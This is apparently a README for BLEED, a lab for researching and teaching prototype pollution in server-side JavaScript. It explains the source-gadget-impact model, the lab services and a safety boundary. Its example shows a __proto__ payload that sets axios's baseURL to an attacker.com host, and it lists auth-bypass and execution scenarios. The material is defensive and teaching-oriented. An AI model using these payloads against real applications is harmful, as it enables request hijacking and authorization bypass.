# BLEED

> One property. Every object.
> Trace the bleed from source to impact.

**BLEED** is a server-side JavaScript prototype-pollution research platform. It provides a structured environment for understanding, tracing, and demonstrating how prototype pollution propagates from a vulnerable merge function through a gadget to a controlled, synthetic impact — without touching any real system.

---

## What is Prototype Pollution?

Every JavaScript object inherits from `Object.prototype`. If an attacker can write an arbitrary property to `Object.prototype`, that property appears on every plain object in the process — because prototypal inheritance means every object looks up the chain when a property is missing.

```js
// Pollution source: unsafe merge of attacker-controlled input
merge(target, JSON.parse(userInput))
// userInput = {"__proto__": {"baseURL": "http://attacker.com"}}

// Gadget: axios reads baseURL from the merged config without hasOwnProperty check
const res = await axios.get('/api/data', config)
// config has no own .baseURL, but Object.prototype.baseURL is now "http://attacker.com"
// → axios sends the request to the attacker's server

// Impact: SYNTHETIC_SSRF (controlled lab simulation only)
```

The three stages — **source → gadget → impact** — are the core mental model in BLEED.

---

## The Source → Gadget → Impact Model

| Stage | Definition | BLEED Example |
|-------|-----------|---------------|
| **Source** | Code that writes attacker-controlled data to `Object.prototype` | `src-recursive-merge`: `Object.assign`-style deep merge without `__proto__` guard |
| **Gadget** | Code that reads a property from an object without `hasOwnProperty`, triggering the inherited value | `GDG-AXIOS-001`: `axios.mergeConfig()` reads `.baseURL` |
| **Impact** | The observable effect of the gadget firing | `SYNTHETIC_SSRF`: HTTP request redirected to attacker-controlled host (simulated) |

BLEED never produces a real exploit. All impacts are **synthetic** — simulated by lab services that record what would have happened.

---

## Controlled Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│  Browser (React UI — port 3001)                         │
│   Dashboard · Sources · Gadgets · Chains · Lab          │
│   Research Catalog · Notebook · Scanner                 │
└─────────────────────┬───────────────────────────────────┘
                      │ HTTP
┌─────────────────────▼───────────────────────────────────┐
│  API (Express — port 4001)                              │
│   /api/sources  /api/gadgets  /api/chains               │
│   /api/scenarios/:id/run  /api/research                 │
│   /api/dependency-scan  /api/metrics                    │
└────────┬──────────────────────────────────────┬─────────┘
         │ Docker network                        │
┌────────▼──────────┐               ┌───────────▼─────────┐
│ vulnerable-app    │               │ hardened-app         │
│ (port 4010)       │               │ (port 4011)          │
│ Reproduces source │               │ Blocks at source     │
│ pollution + gadget│               │ layer, no gadget fire│
└────────┬──────────┘               └─────────────────────┘
         │
┌────────▼───────────────────────────────────────────────┐
│  Impact simulators                                     │
│   http-sim (4020)   auth-sim (4021)   metadata-sim (4022)│
│   Records what an SSRF/auth/exec impact would look like │
└───────────────────────────────────────────────────────-┘
```

---

## Lab Services

| Service | Port | Purpose |
|---------|------|---------|
| `vulnerable-app` | 4010 | Reproduces prototype pollution through each source; fires gadgets |
| `hardened-app` | 4011 | Same sources, with `hasOwnProperty` guards; blocks at merge layer |
| `http-sim` | 4020 | Simulates SSRF: records redirected HTTP requests |
| `auth-sim` | 4021 | Simulates auth bypass: records injected role/admin checks |
| `metadata-sim` | 4022 | Simulates metadata/exec: records environment variable reads |

---

## Scenarios

| ID | Property | Gadget | Impact Class |
|----|----------|--------|--------------|
| `scn-baseurl` | `baseURL` | GDG-AXIOS-001 | SYNTHETIC_SSRF |
| `scn-method` | `method` | GDG-AXIOS-002 | SYNTHETIC_HTTP_MANIPULATION |
| `scn-headers` | `headers` | GDG-AXIOS-003 | SYNTHETIC_HTTP_MANIPULATION |
| `scn-role` | `isAdmin` | GDG-AUTH-001 | SYNTHETIC_AUTH_BYPASS |
| `scn-visitor` | `shell` | GDG-CB-001 | SYNTHETIC_EXECUTION_MARKER |

---

## Getting Started (local dev)

**Prerequisites:** Node.js 20+, npm 9+

```bash
# Install all workspace dependencies
npm install

# Start the API (port 4001)
npm run dev -w apps/api

# Start the frontend (port 3001 or 5173)
npm run dev -w apps/web
```

The frontend proxies API calls to `http://localhost:4001`. If the API is not running, the UI falls back to mock data for all source/gadget/chain pages.

---

## Running the Lab (Docker)

The lab services require Docker Compose.

```bash
# Build and start all lab services + API
docker compose up --build

# Check lab service health
docker compose ps

# Run validation script (from inside the api container)
docker exec bleed-api node /app/scripts/validate-lab.js

# Or run against local lab ports
VULNERABLE_APP_URL=http://localhost:4010 \
HARDENED_APP_URL=http://localhost:4011 \
node scripts/validate-lab.js
```

---

## Running Tests

```bash
# All packages + API (from repo root)
npm test

# Single package
npm test -w packages/runtime-model
npm test -w packages/gadget-engine
npm test -w packages/chain-engine
npm test -w apps/api
```

**Test coverage:**
- `packages/runtime-model` — 11 tests (prototype chain, snapshot, propagation)
- `packages/gadget-engine` — 10 tests (records, matcher, categories)
- `packages/chain-engine` — 12 tests (scenarios, analyzer, builder, confidence)
- `apps/api` — 16 tests (routes, middleware, security)

---

## Architecture

```
bleed/
├── apps/
│   ├── api/          # Express API — routes, middleware, data, services
│   └── web/          # React + Vite frontend (18 pages)
├── packages/
│   ├── shared/       # Shared TypeScript types
│   ├── runtime-model/# Prototype chain tracing, object snapshots
│   ├── gadget-engine/# Gadget records, matcher, categories
│   ├── chain-engine/ # Scenario runner, chain builder, confidence scoring
│   └── evidence/     # In-memory evidence store, JSON/Markdown export
├── lab/
│   ├── vulnerable-app/  # Intentionally unsafe merge implementations
│   ├── hardened-app/    # Hardened variants (hasOwnProperty guards)
│   ├── http-sim/        # SSRF impact simulator
│   ├── auth-sim/        # Auth-bypass impact simulator
│   └── metadata-sim/    # Execution-marker impact simulator
└── docker-compose.yml
```

---

## Safety Boundary

BLEED is a **research and educational platform**. All impact classes are prefixed `SYNTHETIC_` to make this explicit in every log, API response, and UI label.

- The vulnerable-app runs in an isolated Docker network
- Scenario runs are serialized (queue + mutex) to prevent cross-request state leakage
- Prototype state is restored in a `finally` block after every run
- The hardened-app never calls impact simulators
- No real credentials, tokens, or external services are used
- The API enforces a 1 MB body limit and a `labTarget` allowlist

**Do not point the lab services at real infrastructure. Do not run the vulnerable-app on a public network.**

---

## Research Methodology

1. **Identify a source** — a code path that merges or assigns user-controlled data without sanitizing `__proto__`, `constructor`, or `prototype` keys
2. **Identify a gadget** — library code that reads a property from a plain object without `hasOwnProperty`, where the property could be inherited
3. **Build a chain** — trace the path from source → prototype → inherited value → gadget read → impact
4. **Run in lab** — execute the chain against the vulnerable-app; compare with hardened-app
5. **Collect evidence** — capture prototype states before and after, runtime events, and object diffs
6. **Reproduce or classify** — mark the chain as REPRODUCED (live lab run) or POTENTIAL (static analysis only)

---

## Limitations

- BLEED models a small, curated set of gadgets. Real applications may have different gadget surfaces.
- All impacts are synthetic simulations — BLEED does not produce working exploits against real software.
- The source fixtures are simplified versions of real patterns; production code adds complexity that may prevent or enable pollution.
- Lab services reset prototype state between runs, which does not reflect persistent server processes under load.

---

## License

MIT — for research and educational use.

---

*BLEED is a controlled research environment. All reproduction is synthetic. No real systems were targeted.*
